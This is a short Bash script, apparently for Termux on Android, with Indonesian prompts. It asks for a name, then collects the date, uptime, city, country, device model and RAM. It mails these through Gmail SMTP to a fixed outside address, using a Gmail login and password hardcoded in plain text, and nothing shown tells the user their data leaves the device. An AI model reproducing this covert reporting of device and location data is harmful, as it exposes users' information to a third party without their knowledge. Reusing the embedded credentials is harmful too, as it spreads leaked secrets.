#read -p " pesan : " pesan
read -p " nama : " log
echo -e "$log" > $HOME/.logg
hari=$(date +%A)
tanggal=$(date +%d)
bulan=$(date +%m)
tahun=$(date +%Y)
log=$(cat $HOME/.logg)
#log='HALLO TUAN JHON'
pesan=$(echo -e "sedang login" && echo -e "$hari $tanggal $bulan $tahun" )
up=$(uptime -p)
kota=$(curl -s "wttr.in/$location?format=3")
negara=$(curl -s ifconfig.co/country)
device=$(getprop ro.product.model)
ram=$( free -m | awk 'NR==2 {print $2}' )

curl -s --url 'smtps://smtp.gmail.com:465' --ssl-reqd \
  --mail-from 'helc95209@gmail.com' \
  --mail-rcpt 'aji855526@gmail.com' \
  --user 'helc95209@gmail.com:svxsolvclixcvkjj' \
  -T <(echo -e "From: helc95209@gmail.com\nTo: aji855526@gmail.com\nSubject: $log \n\n$negara $device ram $ram$(echo -e "mb") $pesan AKTIF $up KOTA $kota")
  #-T <(echo -e 'hay')
